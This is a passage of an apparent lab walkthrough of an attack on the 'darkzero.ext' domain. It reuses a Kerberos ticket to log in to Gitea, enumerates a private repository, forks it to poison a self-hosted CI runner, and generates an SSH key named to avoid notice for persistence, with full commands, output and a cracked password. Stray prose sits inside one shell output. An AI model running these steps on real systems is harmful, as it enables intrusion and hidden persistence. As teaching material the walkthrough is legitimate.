### 3.12 — Confirm and fingerprint the Gitea instance

Port 3000 on the domain controller matched Gitea's default. Confirm the service identity and version before investing in tunnelling infrastructure to reach it.

**Commands:**

```bash
curl -s -I http://172.16.20.2:3000/
```

```bash
curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`curl -s`|Silent mode — suppress progress output|Fetch quietly|
|`-I`|HEAD request only|Get headers without the page body|
|`grep -iE '<title>\|gitea\|version'`|Case-insensitive extended regex over three patterns|Pull out the identifying lines|
|`head -20`|Limit to first 20 matches|Keep the output readable|

**Result:**

```shell
josh@SRV01:~$ curl -s -I http://172.16.20.2:3000/
HTTP/1.1 200 OK
Date: Wed, 29 Jul 2026 12:01:27 GMT

josh@SRV01:~$ curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
```

```html
<html lang="en-US" data-theme="gitea-auto">
        <title>Gitea: Git with a cup of tea</title>
        <meta name="author" content="Gitea - Git with a cup of tea">
        <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
        <meta name="keywords" content="go,git,self-hosted,gitea">
        <meta property="og:title" content="Gitea: Git with a cup of tea">
        <meta property="og:url" content="http://gitea.darkzero.ext:3000/">
        <meta property="og:description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
<meta property="og:site_name" content="Gitea: Git with a cup of tea">
<link rel="stylesheet" href="/assets/css/theme-gitea-auto.css?v=1.25.0">
                appUrl: 'http:\/\/gitea.darkzero.ext:3000\/',
                assetVersionEncoded: encodeURIComponent('1.25.0'), 
                customEmojis: {"codeberg":":codeberg:","git":":git:","gitea":":gitea:","github":":github:","gitlab":":gitlab:","gogs":":gogs:"},
                        <a class="item" target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com">Help</a>
                                        Gitea: Git with a cup of tea
                                Simply <a target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com/installation/install-from-binary">run the binary</a> for your platform, ship it with <a target="_blank" rel="noopener noreferrer" href="https://github.com/go-gitea/gitea/tree/master/docker">Docker</a>, or get it <a target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com/installation/install-from-package">packaged</a>.
                                Gitea runs anywhere <a target="_blank" rel="noopener noreferrer" href="https://go.dev/">Go</a> can compile for: Windows, macOS, Linux, ARM, etc. Choose the one you love!
                                Gitea has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!
                                Go get <a target="_blank" rel="noopener noreferrer" href="https://code.gitea.io/gitea">code.gitea.io/gitea</a>! Join us by <a target="_blank" rel="noopener noreferrer" href="https://github.com/go-gitea/gitea">contributing</a> to make this project even better. Don't be shy to be a contributor!
                        <a target="_blank" rel="noopener noreferrer" href="https://about.gitea.com">Powered by Gitea</a>
```

**What this gives you:** Confirmed service identity, exact version, and the hostname the application expects.

**Key findings:**

- **The service is Gitea version 1.25.0**, confirmed twice — in the stylesheet cache-buster (`?v=1.25.0`) and in the JavaScript `assetVersionEncoded` value.
- **The instance identifies itself as `gitea.darkzero.ext`** via its configured `appUrl`. Gitea generates absolute URLs from this setting, and any authentication mechanism bound to a service principal will be registered against this hostname rather than the IP address. Requests must therefore use the name, not `172.16.20.2`.
- The response omits a `Server` header, so no framework fingerprinting is available from headers alone. Version disclosure comes from asset URLs in the page body instead.
- The landing page is Gitea's default unauthenticated view — marketing copy, no repository listing. Anonymous access to repositories is not permitted; authentication is required to enumerate content.
- HTTP is unencrypted on port 3000. No TLS, so traffic to this service is readable in transit.
- Gitea 1.25 ships the Actions CI/CD subsystem, which pairs with the runner agent found at `/opt/gitea-runner` in 3.4. Workflows defined in repositories are dispatched to that runner and executed on SRV01 as `svc-runner`.

**Next:** Establish a tunnel from the attacking host into `172.16.20.0/24` so the Gitea web interface can be reached directly, and determine which authentication methods it accepts.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.13 — Confirm Kerberos credentials on the domain-joined host

SRV01 resolves against AD DNS with a domain search suffix, indicating domain membership. Domain-joined Linux hosts typically authenticate SSH logins via Kerberos, which would leave a usable ticket in the user's credential cache.

**Commands:**

```bash
klist
```

```bash
which kinit klist kvno; ls -la /etc/krb5.conf
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`klist`|List Kerberos tickets in the current credential cache|Show what authentication tickets I already hold|
|`which kinit klist kvno`|Locate Kerberos client binaries|Check the Kerberos tools are installed|
|`ls -la /etc/krb5.conf`|Inspect the Kerberos client configuration file|Confirm the host is configured for a realm|

**Result:**

```shell
josh@SRV01:~$ klist
Ticket cache: KEYRING:persistent:780601110:krb_ccache_cuTA7ev
Default principal: josh@DARKZERO.EXT

Valid starting       Expires              Service principal
07/29/2026 11:18:56  07/29/2026 21:18:56  krbtgt/DARKZERO.EXT@DARKZERO.EXT
        renew until 08/05/2026 11:18:56

josh@SRV01:~$ which kinit klist kvno; ls -la /etc/krb5.conf
/usr/bin/kinit
/usr/bin/klist
/usr/bin/kvno
-rw-r--r-- 1 root root 693 Jul 29 04:54 /etc/krb5.conf
```

**What this gives you:** An active domain credential requiring no further authentication.

**Key findings:**

- **josh holds a valid Kerberos TGT for `josh@DARKZERO.EXT`**, obtained automatically during SSH login. It is valid for ten hours and renewable for a week.
- A TGT is the master credential in Kerberos. It can be exchanged at the KDC for service tickets to any service in the domain, without re-supplying a password. Every domain service on `172.16.20.2` is now reachable with authentication.
- The MIT Kerberos client suite is installed — `kinit`, `klist`, and `kvno` are all present, and `/etc/krb5.conf` exists. This host is fully configured as a Kerberos client, which also means `ksu` may be available later.
- The credential cache uses the kernel `KEYRING` backend rather than a file in `/tmp`. Reference material for this target records a file-based cache at `/tmp/krb5cc_1001`; this instance differs. Tools requiring a file cache will need one exported explicitly.
- The realm is `DARKZERO.EXT`, matching the `darkzero.ext` domain from DNS. Kerberos realms are conventionally the uppercase form of the DNS domain.
- Operating from SRV01 avoids the need to replicate Kerberos configuration on the attacking host. The ticket, the configuration, and network reachability to the KDC all already exist here.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

##### What a TGT is and why holding one matters

Kerberos avoids sending passwords across the network by using tickets — time-limited, cryptographically sealed tokens issued by a Key Distribution Center running on the domain controller.

Authentication happens in two stages. First, proving knowledge of the password once earns a **Ticket Granting Ticket**, encrypted with the KDC's own key so only the KDC can read it. Second, to reach any particular service, the TGT is presented back to the KDC in exchange for a **service ticket** scoped to that service alone.

The service ticket is encrypted with the service account's key, which is how the service verifies it — it decrypts the ticket and trusts the identity inside, because only the KDC could have produced something it can decrypt.

For an attacker, possessing a TGT is close to possessing the password. Service tickets can be requested for any service in the domain, silently, without further authentication and without triggering password-based logon events. The ticket here is valid for ten hours and renewable for seven days.

Services are named by **Service Principal Name**, in the form `SERVICE/hostname` — for a web application, `HTTP/gitea.darkzero.ext`. This is why the `appUrl` observed in 3.12 matters: the SPN is registered against the hostname, so a ticket request must use that exact name. Requesting a ticket for `HTTP/172.16.20.2` would fail, because no such SPN exists in the directory.

**Next:** Verify that a service ticket can be obtained for the Gitea web service, confirming SPN-based authentication is available.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.14 — Verify a service ticket for the Gitea web service

**Why this step:** A valid TGT is held, and Gitea identifies itself as `gitea.darkzero.ext`. Confirm the hostname resolves and that a Service Principal Name exists for its web service, which would establish Kerberos as an available authentication path.

**Commands:**

```bash
getent hosts gitea.darkzero.ext
```

```bash
kvno HTTP/gitea.darkzero.ext
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`getent hosts`|Resolve a hostname through the system's name-service switch|Ask the OS what address this name maps to|
|`kvno`|Request a service ticket and print its key version number|Ask the KDC for a ticket to this specific service|
|`HTTP/gitea.darkzero.ext`|The Service Principal Name for the web service on that host|The formal name Kerberos knows the website by|

**Result:**

```shell
josh@SRV01:~$ getent hosts gitea.darkzero.ext
172.16.20.2     gitea.darkzero.ext

josh@SRV01:~$ kvno HTTP/gitea.darkzero.ext
HTTP/gitea.darkzero.ext@DARKZERO.EXT: kvno = 3
```

**What this gives you:** Confirmation that Kerberos authentication to Gitea is available and functional.

**Key findings:**

- **`gitea.darkzero.ext` resolves to `172.16.20.2` via AD DNS.** No hosts-file modification is required — the domain's own DNS serves the record, and josh lacks write access to `/etc/hosts` in any case.
- **The SPN `HTTP/gitea.darkzero.ext@DARKZERO.EXT` is registered, with key version 3.** `kvno` succeeded, meaning the KDC located the principal and issued a service ticket into the credential cache. A missing SPN would have returned `Server not found in Kerberos database`.
- The existence of an `HTTP/` SPN means Gitea is configured for **SPNEGO/Negotiate authentication** — Gitea's SSPI authentication source. Clients present a Kerberos service ticket in an HTTP header instead of submitting a username and password.
- Key version 3 indicates the service account's password has been changed at least twice since creation, which is consistent with a maintained rather than freshly-provisioned service.
- The ticket is now cached alongside the TGT. A subsequent Negotiate-capable HTTP client can use it without contacting the KDC again.
- Authentication proceeds without a password. josh's `Rangers1` credential is not needed for Gitea; the TGT obtained at SSH login is sufficient.

**Next:** Authenticate to the Gitea web interface using HTTP Negotiate and capture the resulting session.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.15 — Authenticate to Gitea via HTTP Negotiate

A service ticket for `HTTP/gitea.darkzero.ext` was successfully obtained, indicating Gitea accepts SPNEGO authentication. Present that ticket over HTTP to establish an authenticated session.

**Commands:**

```bash
curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -o /dev/null -w "%{http_code}\n"
```

```bash
cat /tmp/gitea_cookies.txt
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`curl -s`|Silent mode|Suppress progress output|
|`--negotiate`|Enable SPNEGO/GSSAPI authentication|Use Kerberos tickets instead of a password|
|`-u :`|Empty username and password|**Required** — tells curl to draw credentials from the ticket cache rather than prompt|
|`-c /tmp/gitea_cookies.txt`|Write received cookies to a jar file|Save the session for reuse|
|`?auth_with_sspi=1`|Gitea query parameter forcing SSPI authentication|Ask for ticket-based login instead of the password form|
|`-o /dev/null`|Discard the response body|Only the status and cookies matter|
|`-w "%{http_code}\n"`|Print the HTTP status code|Show the result in one line|

**Result:**

```shell
josh@SRV01:~$ curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -o /dev/null -w "%{http_code}\n"
303

josh@SRV01:~$ cat /tmp/gitea_cookies.txt
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   1785413446      _csrf   H2bovDeXiiZiQoesymaDH6gNzvs6MTc4NTMyNzA0NjcwNTI0MzEwMA
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       lang    en-US
#HttpOnly_gitea.darkzero.ext    FALSE   /       FALSE   0       i_like_gitea    80ee670d68ef31d7
```

**What this gives you:** An authenticated Gitea session obtained without a password.

**Key findings:**

- **Kerberos authentication to Gitea succeeded.** HTTP 303 See Other is Gitea's post-login redirect, not an error condition. A failed authentication would return 200 with the login form re-rendered, or 401.
- **Session established: `i_like_gitea=80ee670d68ef31d7`.** This is Gitea's session cookie and authenticates all subsequent requests as josh.
- A `_csrf` token was also issued, required for any state-changing API call — creating forks, pushing content, opening pull requests. Gitea enforces CSRF protection on write operations exactly as the campaign application did.
- No password was submitted at any point. The `-u :` flag supplies empty credentials and curl performs the SPNEGO handshake using the cached service ticket. Gitea's SSPI authentication source accepts the ticket as proof of identity.
- Cookies are marked `HttpOnly`, so they are inaccessible to JavaScript — irrelevant here, since the session is being driven from the command line rather than a browser.
- The session was obtained entirely from SRV01. No tunnel, no Kerberos configuration on the attacking host, and no `/etc/hosts` modification were required.
<div align="center">
<br>
<br>
</div>

##### SPNEGO, and why single sign-on is not password-free security

SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism) is the standard for carrying Kerberos authentication over HTTP. It is what makes single sign-on work in enterprise environments — a domain user opens an internal web application and is logged in automatically, with no credential prompt.

The exchange is straightforward. The client requests a protected resource. The server replies `401 Unauthorized` with the header `WWW-Authenticate: Negotiate`. The client obtains a service ticket for the server's SPN from the KDC, base64-encodes it, and resends the request with `Authorization: Negotiate <ticket>`. The server decrypts the ticket using its own service account key, reads the authenticated identity inside, and issues a session.

The property that matters to an attacker: **anyone holding a valid TGT can complete this exchange.** SPNEGO is often perceived as more secure than password authentication because no password crosses the network — but the TGT _is_ the credential, and a TGT is obtained from a password. Cracking josh's application password, reusing it over SSH, and inheriting his Kerberos ticket produced access to a web application whose login form was never touched.

Gitea's SSPI authentication source works in exactly this way and, importantly, **cannot be used with a username and password**. It requires a genuine Kerberos service ticket for `HTTP/gitea.darkzero.ext`. Possession of josh's password alone, without the domain infrastructure to convert it into a ticket, would not have granted access. Operating from the domain-joined host is what made this trivial.

**Next:** Enumerate repositories visible to josh in Gitea.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.16 — Enumerate Gitea identity and accessible repositories

An authenticated session exists. Establish which account the Kerberos ticket maps to, what privileges it holds, and which repositories are reachable.

**Commands:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
```

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`-b /tmp/gitea_cookies.txt`|**Read** cookies from the jar|Reuse the session already established (`-c` writes, `-b` reads)|
|`/api/v1/user`|Gitea endpoint returning the authenticated user|"Who am I?"|
|`python3 -m json.tool`|Pretty-print JSON|Make the response readable|
|`/api/v1/repos/search?limit=50`|Search all repositories visible to the session|List everything this account can see|
|`python3 -c "..."`|Extract `full_name` and `private` from each result|Reduce the response to the fields that matter|

**Result:**

```json
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
{
    "id": 6,
    "login": "darkzero-ext_josh",
    "login_name": "",
    "source_id": 0,
    "full_name": "",
    "email": "ad8a459d-f75e-46b7-92b7-4213defd890d@localhost.localdomain",
    "avatar_url": "http://gitea.darkzero.ext:3000/avatars/5f3a440ab8b9ef02507361310493654d",
    "html_url": "http://gitea.darkzero.ext:3000/darkzero-ext_josh",
    "language": "en-US",
    "is_admin": false,
    "last_login": "1969-12-31T16:00:00-08:00",
    "created": "2026-05-20T13:44:57-07:00",
    "restricted": false,
    "active": true,
    "prohibit_login": false,
    "location": "",
    "website": "",
    "description": "",
    "visibility": "public",
    "followers_count": 0,
    "following_count": 0,
    "starred_repos_count": 0,
    "username": "darkzero-ext_josh"
}
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
DarkZero/DarkZero-Campaigns | private: True
```

**What this gives you:** Confirmed identity within Gitea and the scope of accessible content.

**Key findings:**

- **The session authenticates as `darkzero-ext_josh` (user id 6).** Gitea's SSPI provider auto-provisions domain users with the naming convention `<domain-with-dots-replaced-by-hyphens>_<username>`, so `josh@darkzero.ext` becomes `darkzero-ext_josh`.
- The account was created 2026-05-20, one day after josh's application account (3.6). Both were provisioned as part of the same onboarding.
- `is_admin: false` and `restricted: false`. Standard privileges — no site administration, but no restrictions on normal operations such as forking, opening issues, or creating pull requests.
- **One repository is visible: `DarkZero/DarkZero-Campaigns`, marked private.** This is the source code of the web application exploited in section 3.1. josh holds read access to a private organisation repository.
- The email address is a generated placeholder (`<uuid>@localhost.localdomain`), confirming automatic provisioning rather than manual account creation.
- `last_login` shows the Unix epoch, meaning the account has never completed an interactive form login. All access has been via SSPI.
- Repository search returns only this one entry. Additional repositories may exist that josh cannot see; the result reflects visibility, not the full server contents.

**Next:** Enumerate the repository's contents, with particular attention to CI/CD workflow definitions that the Actions runner on SRV01 executes.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.17 — Enumerate repository permissions and workflow configuration

The runner at `/opt/gitea-runner` executes workflows from Gitea as `svc-runner`. Determine josh's access level to the repository and whether Actions are enabled.

**Commands:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('perms:', d.get('permissions')); print('default_branch:', d.get('default_branch')); print('has_actions:', d.get('has_actions'))"
```

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
  | python3 -m json.tool
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`/api/v1/repos/<org>/<repo>`|Repository metadata endpoint|Details about the repo|
|`d.get('permissions')`|Extract the caller's access rights|What am I allowed to do here|
|`has_actions`|Whether CI/CD is enabled on this repository|Does this repo run build jobs|
|`/contents/.gitea/workflows`|Directory listing endpoint for the workflow folder|List the CI job definitions|

**Result:**

```shell
josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('perms:', d.get('permissions')); print('default_branch:', d.get('default_branch')); print('has_actions:', d.get('has_actions')); print('fork:', d.get('allow_fork', 'n/a'))"
perms: {'admin': False, 'push': False, 'pull': True}
default_branch: main
has_actions: True
fork: n/a

josh@SRV01:~$ curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
  | python3 -m json.tool
[
    {
        "name": "main.yml",
        "path": ".gitea/workflows/main.yml",
        "sha": "2ce5d268ecd274e85d0379ce819956a59bab95b8",
        "last_commit_sha": "0d2c697eb31acef7ec81df70d33415cd0150b116",
        "last_committer_date": "2026-05-20T22:01:19+01:00",
        "last_author_date": "2026-05-20T22:01:19+01:00",
        "type": "file",
        "size": 295,
        "encoding": null,
        "content": null,
        "target": null,
        "url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows/main.yml?ref=main",
        "html_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/src/branch/main/.gitea/workflows/main.yml",
        "git_url": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/git/blobs/2ce5d268ecd274e85d0379ce819956a59bab95b8",
        "download_url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml",
        "submodule_git_url": null,
        "_links": {
            "self": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows/main.yml?ref=main",
            "git": "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/git/blobs/2ce5d268ecd274e85d0379ce819956a59bab95b8",
            "html": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/src/branch/main/.gitea/workflows/main.yml"
        }
    }
]
```

**What this gives you:** The exact boundary of josh's access, and confirmation that a live CI/CD pipeline is attached to this repository.

**Key findings:**

- **josh has read-only access: `pull: True`, `push: False`, `admin: False`.** Cloning and reading are permitted; committing directly to this repository is not. Any attack requiring modified workflow content must reach the runner by some route other than a direct push.
- **Actions are enabled (`has_actions: True`).** The repository dispatches CI jobs to the self-hosted runner identified at `/opt/gitea-runner` on SRV01, which executes as `svc-runner` — an account josh cannot currently access.
- **One workflow exists: `.gitea/workflows/main.yml`**, 295 bytes, last modified 2026-05-20. Its trigger conditions determine what events cause the runner to execute, and are the next thing to examine.
- The default branch is `main`. Pull requests and workflow triggers are evaluated against this branch.
- The workflow was committed in `0d2c697eb31acef7ec81df70d33415cd0150b116`. Reference material for this target names the same commit `0d2c697eb3` with the message "Add main.yml", authored by user `david` — consistent with this instance.
- Directory listings return metadata only; `content` is null. Retrieving the file body requires a separate request to the file endpoint or the raw download URL.

**Next:** Read the workflow definition to determine its trigger events and the commands it executes.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.18 — Read the workflow definition

A workflow file exists and Actions are enabled. Its trigger events determine what an unprivileged user can cause the runner to execute.

**Command:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`/raw/branch/main/<path>`|Gitea raw-content endpoint|Fetch the file body directly, not JSON metadata|
|`-b /tmp/gitea_cookies.txt`|Present the authenticated session|Required — the repository is private|

**Result:**

```yaml
# TODO : Add Tests & Deployment
name: CI
on: [push, pull_request]
jobs:
  ci:
    runs-on: ubuntu
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
      - run: npm ci
      - run: npm test
      - run: npm run build
```

**Workflow analysis:**

|Directive|Value|Significance|Simple Explanation|
|---|---|---|---|
|`on`|`[push, pull_request]`|Two trigger events; `pull_request` does not require write access|The job runs when someone pushes code _or_ opens a pull request|
|`runs-on`|`ubuntu`|Dispatched to the self-hosted runner, not a container image|It runs on SRV01, as `svc-runner`|
|`actions/checkout@v4`|—|Clones the PR's head commit into the workspace|Downloads the submitted code|
|`actions/setup-node@v4`|node 20|Installs Node.js|Prepares the build environment|
|`npm ci`|—|Installs dependencies from `package-lock.json`|Fetches libraries — **runs lifecycle scripts**|
|`npm test`|—|Executes the `test` script from `package.json`|Runs whatever `package.json` defines as "test"|
|`npm run build`|—|Executes the `build` script from `package.json`|Runs whatever `package.json` defines as "build"|

**Key findings:**

- **The workflow triggers on `pull_request`, an event josh can raise without write access.** Direct pushes are blocked by `push: False`, but opening a pull request requires only the ability to fork the repository — a permission granted to any user with read access.
- **`runs-on: ubuntu` targets the self-hosted runner**, not an ephemeral container. Jobs execute directly on SRV01 under the `svc-runner` account. Code execution in this workflow is code execution as `svc-runner` on a host where a shell is already held as `josh`.
- **Every build step executes attacker-controlled content.** `npm ci`, `npm test`, and `npm run build` all invoke commands defined in `package.json` — a file that lives in the repository and would be replaced by the contents of a pull request. `npm ci` additionally runs `preinstall`, `install`, and `postinstall` lifecycle hooks from any dependency.
- No approval condition, environment gate, or branch restriction appears in the workflow. Whatever protection exists against untrusted pull requests is enforced by Gitea itself rather than by this file.
- The `# TODO : Add Tests & Deployment` comment indicates an incomplete pipeline committed to a production-adjacent repository.
<div align="center">
<br>
<br>
</div>

##### Why CI/CD runners are high-value targets

A continuous-integration runner exists to fetch code and execute it. That is its entire purpose, and it is why runners are among the most valuable targets in any environment that has one.

The pipeline defined above does exactly what every CI pipeline does: check out a revision, install dependencies, run the test suite, build the artefact. Each of those steps executes instructions that live _inside the repository_. `npm test` does not run a fixed command — it runs whatever string appears under `"test"` in `package.json`. Replace that string and the runner obeys.

Three properties compound the risk here.

The runner is **self-hosted**, not ephemeral. Cloud-hosted runners spin up a fresh container per job and destroy it afterwards, limiting the blast radius. A self-hosted runner is a persistent process on a real machine, so code execution means access to that machine's filesystem, network position, and any credentials it holds.

It executes as a **dedicated service account**, `svc-runner`, which typically holds permissions the developers themselves do not — deployment rights, registry credentials, or in a domain environment, directory permissions.

And the trigger is **`pull_request`**, which by design accepts contributions from users who cannot write to the repository. That is the point of pull requests. It also means the set of people who can cause the runner to execute code is much larger than the set who can commit to the default branch.

Mature platforms mitigate this by requiring maintainer approval before running workflows on pull requests from forks. That approval gate is the only thing standing between read-only access and code execution as the runner account — which makes any flaw in the gate itself the critical vulnerability.

**Next:** Fork the repository into josh's namespace to obtain a writable copy from which pull requests can be raised.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.19 — Fork the repository to obtain a writable copy

Josh holds read-only access to `DarkZero/DarkZero-Campaigns` and cannot modify the workflow directly. Forking produces a copy under josh's own namespace with full write permissions, from which pull requests can be raised against the upstream repository.

**Command:**

```bash
CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -H "X-Csrf-Token: $CSRF" \
  -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`grep _csrf ... \| awk '{print $7}'`|Extract the CSRF token from the cookie jar's 7th field|Pull the anti-forgery token out of the saved cookies|
|`-X POST`|HTTP POST — a state-changing request|Create something rather than read something|
|`-H "X-Csrf-Token: $CSRF"`|Present the token in a header|Prove the request is legitimate|
|`-d '{}'`|Empty JSON body — fork into the caller's own namespace|No options needed; default to my account|
|`/repos/<org>/<repo>/forks`|Gitea fork-creation endpoint|Make me a copy of this repository|

**Result:**

```shell
josh@SRV01:~$ CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -H "X-Csrf-Token: $CSRF" \
  -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"

A fork lands in your own namespace with full write access — which is the foothold for
full_name: darkzero-ext_josh/DarkZero-Campaigns
perms: {'admin': True, 'push': True, 'pull': True}
message: 
A: command not found
```

**What this gives you:** A fully writable copy of the private repository, including its workflow configuration.

**Key findings:**

- **Fork created at `darkzero-ext_josh/DarkZero-Campaigns` with `admin`, `push`, and `pull` all true.** Read-only access to the upstream repository converts into full control over a derived copy.
- Forking a **private** repository was permitted. josh's read access was sufficient; no additional authorisation was required, and no approval step intervened.
- The fork inherits the complete repository contents, including `.gitea/workflows/main.yml` and its `pull_request` trigger.
- Write access to the fork means arbitrary modification of `package.json`, workflow files, and any other content that the upstream CI pipeline would execute.
- josh is now positioned to raise pull requests against `DarkZero/DarkZero-Campaigns` from a branch whose contents he fully controls.

**Next:** Prepare an SSH keypair on the attacking side, to be planted by the workflow payload for persistent access as `svc-runner`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.20 — Generate an SSH keypair for runner persistence

**Why this step:** The workflow payload must leave behind durable access rather than a single command's output. An SSH public key appended to `svc-runner`'s `authorized_keys` converts one job execution into an interactive session on a host already reachable.

**Commands:**

```bash
ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
```

```bash
cat /tmp/.runner_key.pub
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ssh-keygen`|Generate an SSH keypair|Make a key to log in with|
|`-t ed25519`|Use the Ed25519 algorithm|Modern, short, fast|
|`-f /tmp/.runner_key`|Output path for the private key|Where to save it; public half gets `.pub` appended|
|`-N ''`|Empty passphrase|Required for non-interactive use — no prompt on login|
|`-C 'ci'`|Comment field|Innocuous label; blends with build tooling|
|`cat ...pub`|Print the public key|The half that goes on the target account|

The keypair is generated on SRV01 rather than the attacking host because that is where it will be used — the runner and the SSH service are both on this machine, so no transfer is required.

**Result:**

```shell
josh@SRV01:~$ ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/.runner_key
Your public key has been saved in /tmp/.runner_key.pub
The key fingerprint is:
SHA256:cPuvkKA76lTGe+mcMRmQhXBHAlxYjv+u3o5Qs7ljkbY ci
The key's randomart image is:
+--[ED25519 256]--+
| .o*=o+          |
|  o+.=           |
|  . + . .        |
|   o . o .       |
|    B.o S        |
|   ++B = o       |
|  o.=oB o .      |
| . .EX + . .     |
| .o+*=B   ...    |
+----[SHA256]-----+

josh@SRV01:~$ cat /tmp/.runner_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci
josh@SRV01:~$ 
```

**What this gives you:** A credential the workflow payload can install, granting interactive access as the runner account.

**Key findings:**

- Keypair written to `/tmp/.runner_key` (private) and `/tmp/.runner_key.pub` (public), with no passphrase.
- The public key is the payload's deliverable. Appending it to `/home/svc-runner/.ssh/authorized_keys` permits `ssh svc-runner@172.16.20.3 -i /tmp/.runner_key` without a password.
- The leading dot in the filename hides it from a plain `ls` in `/tmp`, and the `ci` comment is consistent with build automation.
